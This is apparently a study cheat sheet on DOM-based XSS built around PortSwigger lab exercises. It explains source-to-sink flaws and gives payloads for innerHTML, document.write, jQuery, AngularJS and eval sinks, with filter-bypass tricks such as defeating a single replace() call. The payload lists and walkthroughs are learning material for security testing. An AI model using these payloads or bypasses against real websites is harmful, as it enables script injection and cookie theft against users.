# XSS - DOM-based

Client-side JavaScript reads from a **source** (location.search, location.hash, document.referrer, postMessage) and writes to a **sink** (innerHTML, document.write, eval, jQuery `$()`, `.attr('href',...)`). The payload never touches the server - the server's response is clean; the vulnerability lives entirely in client-side code.

## Quick reference
```
# document.write sink (breaks out of img src)
"><svg onload=alert(1)>

# innerHTML sink (script tags don't execute via innerHTML)
<img src=1 onerror=alert(1)>

# jQuery .attr('href') sink
javascript:alert(document.cookie)

# jQuery selector sink (hashchange)
<iframe src="https://LAB/#" onload="this.contentWindow.location='https://LAB/#<img src=1 onerror=alert(1)>'">

# document.write inside <select>
</select><img src=1 onerror=alert(1)>

# AngularJS ng-app expression
{{$on.constructor('alert(1)')()}}

# Reflected DOM XSS (JSON-encoded eval context)
\"-alert(1)}//

# Stored DOM XSS (replace() only replaces first match)
<><img src=1 onerror=alert(1)>
```

## Root cause
Dangerous sinks accept and render HTML/JS from sources without sanitization. Key sinks: `innerHTML`, `document.write()`, `eval()`, `setTimeout(string)`, `setInterval(string)`, jQuery `$()` selector, `.html()`, `.attr()`. Key sources: `location.search`, `location.hash`, `document.referrer`, `window.name`, `postMessage` data.

## Find it
**Manual:**
- DevTools -> Sources -> Ctrl+F for `innerHTML`, `document.write`, `eval`, `location`, `\.hash`, `\.search`
- Trace the variable from assignment to sink call
- Test: submit `"><img src=x>` and check if the tag appears in the DOM (use Inspector, not source)

**Automated:**
- Burp DOM Invader extension -> intercept+monitor all source->sink flows
- Check JS files for patterns like: `var x = location.search; document.write(x);`

## Technique
**document.write sink:** input goes into `document.write('<img src="...INPUT...">`)`. Payload `"><svg onload=alert(1)>` closes the img tag (`">`), then injects a new SVG element.

**innerHTML sink:** `element.innerHTML = location.search`. `<script>` tags set via innerHTML don't execute (browser security). Use event-based tags: `<img src=1 onerror=alert(1)>`.

**jQuery anchor href:** `$('a').attr('href', returnPath)`. `returnPath` = `javascript:alert(document.cookie)` - the javascript: URI is set as the href; clicking the link executes it.

**jQuery selector (hashchange):** `$(location.hash)` evaluates hash as HTML selector. When hash contains `<img src=1 onerror=alert(1)>`, jQuery tries to parse it as HTML and creates the element in the DOM, triggering onerror. Deliver via iframe (same-origin): `<iframe src="LAB/#" onload="this.contentWindow.location.hash='<img src=1 onerror=alert(1)>'">`.

**document.write inside select:** input in `document.write('<select><option>' + storeId + '</option></select>')`. Need to close the `<select>` before injecting: `</select><img src=1 onerror=alert(1)>`.

**AngularJS expression:** page has `ng-app`; AngularJS evaluates `{{...}}` as expressions. `{{$on.constructor('alert(1)')()}}` - `$on.constructor` is the Function constructor; calling it with a string creates and immediately executes a function. Avoids needing `$eval` directly.

**Reflected DOM XSS (eval + JSON):** response includes `eval('{"searchTerm":"INPUT"}')`. Input is JSON-encoded. Inject `\"-alert(1)}//`:
- The JSON encoder turns `"` to `\"`, but our leading `\` turns it into `\\"` (escaped backslash + unescaped `"`).
- Result: `{"searchTerm":"\\"-alert(1)}//"}` -> `\"` = literal `\`, then `"` closes JSON string -> `-alert(1)` runs, `}//` ends the object and comments rest.

**Stored DOM XSS (replace() first match only):** JS comment sanitizer uses `replace('<', '&lt;')` - only replaces the FIRST `<`. Input `<><img src=1 onerror=alert(1)>`: the first `<>` is replaced with `&lt;>`, the second `<img...>` is not touched -> XSS executes.

## Payload arsenal
```javascript
// document.write sink
"><svg onload=alert(1)>
"><img src=1 onerror=alert(1)>

// innerHTML sink
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>

// jQuery href sink
javascript:alert(document.cookie)

// jQuery selector (hashchange) - deliver via iframe from exploit server
<iframe src="https://LAB-ID.web-security-academy.net/#" onload="this.contentWindow.location='https://LAB-ID.web-security-academy.net/#<img src=1 onerror=alert(1)>'">

// document.write inside select
</select><img src=1 onerror=alert(1)>

// AngularJS expression
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}

// Reflected DOM XSS
\"-alert(1)}//

// Stored DOM XSS (bypass single replace)
<><img src=1 onerror=alert(1)>
```

## Bypasses
| Sink/Defense | Bypass |
|---|---|
| innerHTML (script blocked) | `<img onerror>`, `<svg onload>`, `<details ontoggle>` |
| jQuery selector XSS needs delivery | Deliver via iframe with `onload` that sets location.hash |
| JSON encoding in eval context | `\"` + leading `\` creates `\\"` + unescaped `"` |
| replace() sanitization | Only first match replaced - prefix with `<>` to consume the replace |

## Exploitation walkthrough
**document.write:** search `"><svg onload=alert(1)>` -> page writes `<img src=""><svg onload=alert(1)>">` -> alert.

**innerHTML:** search `<img src=1 onerror=alert(1)>` -> set as innerHTML -> img fails to load -> onerror fires.

**jQuery href:** feedback page, set `returnPath=javascript:alert(document.cookie)` -> link renders with JS URI -> click -> alert.

**jQuery selector hashchange:** exploit server iframe with `onload` that sets window hash to `<img src=1 onerror=alert(1)>` -> deliver to victim.

**select element:** add `storeId=</select><img src=1 onerror=alert(1)>` as URL param -> document.write closes select, creates img.

**AngularJS:** `{{$on.constructor('alert(1)')()}}` in search -> AngularJS evaluates -> Function constructor executes alert.

**Reflected DOM:** search `\"-alert(1)}//` -> JSON encoder turns `"` to `\"` but our `\` makes `\\"` -> `"` breaks out of JSON string.

**Stored DOM:** comment with `<><img src=1 onerror=alert(1)>` -> replace() removes only first `<>` -> rest executes.

## Chaining
- DOM XSS in jQuery hash -> victim-controlled delivery -> [Exploiting-XSS](../Exploiting-XSS/)
- AngularJS expression -> same exploitation primitives as stored XSS
- DOM sources via postMessage -> [DOM-based-vulnerabilities](../../DOM-based-vulnerabilities/) (cross-origin variant)

## Tools
- **Burp DOM Invader** - automated source->sink tracing
- **DevTools Sources** - search JS files for dangerous sinks
- **DevTools Inspector** - see if injected HTML actually enters the DOM
- **Exploit server** - host iframe delivery for hashchange attacks

## Labs

### DOM XSS in document.write sink using source location.search [Apprentice]
`location.search` fed to `document.write` inside `<img src="...">`. Payload `"><svg onload=alert(1)>` closes src and injects SVG. Key insight: document.write creates HTML; break out of the current element context.

### DOM XSS in innerHTML sink using source location.search [Apprentice]
`location.search` set as `innerHTML`. `<script>` doesn't execute via innerHTML. `<img src=1 onerror=alert(1)>` fires on image load failure. Key insight: `<script>` via innerHTML is deliberately blocked; use event-based payloads.

### DOM XSS in jQuery anchor href attribute sink using location.search source [Apprentice]
jQuery sets href from `returnPath` URL param: `$('a').attr('href', returnPath)`. Set `returnPath=javascript:alert(document.cookie)` -> JS URI executes on click. Key insight: jQuery `.attr('href')` doesn't sanitize javascript: URIs.

### DOM XSS in jQuery selector sink using a hashchange event [Apprentice]
`$(location.hash)` evaluates hash as jQuery selector/HTML. Deliver via iframe: `<iframe src="LAB/#" onload="...set hash to payload...">`. Key insight: jQuery selector sink parses HTML; hashchange needed to trigger; requires iframe delivery.

### DOM XSS in document.write sink inside a select element [Practitioner]
`storeId` URL param written inside a `<select>` via document.write. Must close select first: `</select><img src=1 onerror=alert(1)>`. Key insight: you're inside a different HTML element - must break out of that element before injecting.

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded [Practitioner]
`ng-app` page; search term inside Angular scope; `<>` and `"` encoded but `{{}}` not. `{{$on.constructor('alert(1)')()}}` executes via Function constructor. Key insight: AngularJS template expressions evaluate even when HTML chars are encoded.

### Reflected DOM XSS [Practitioner]
Server JSON-encodes input into eval() call. `\"-alert(1)}//` - leading `\` escapes the added backslash, freeing `"` to break JSON string. Key insight: the JSON encoder and the JS interpreter disagree about what the `\"` means.

### Stored DOM XSS [Practitioner]
Comment sanitizer uses `replace('<', '&lt;')` - only replaces the first `<`. `<><img src=1 onerror=alert(1)>` - the `<>` is consumed by the replace, the `<img...>` passes through. Key insight: `String.replace(str, ...)` without a regex flag only replaces the first occurrence.

## Real-world notes
- DOM XSS is underdetected because it's invisible to server-side analysis and basic scanners.
- AngularJS `ng-app` is a common misconfiguration - if user input ever enters the Angular scope, template injection is possible.
- The `location.hash` source is particularly dangerous because it's never sent to the server, leaving no server-side log of the attack.
- `document.write` is deprecated but still found in legacy code and analytics/ad libraries.

## References
- https://portswigger.net/web-security/cross-site-scripting/dom-based
- https://portswigger.net/web-security/cross-site-scripting/contexts
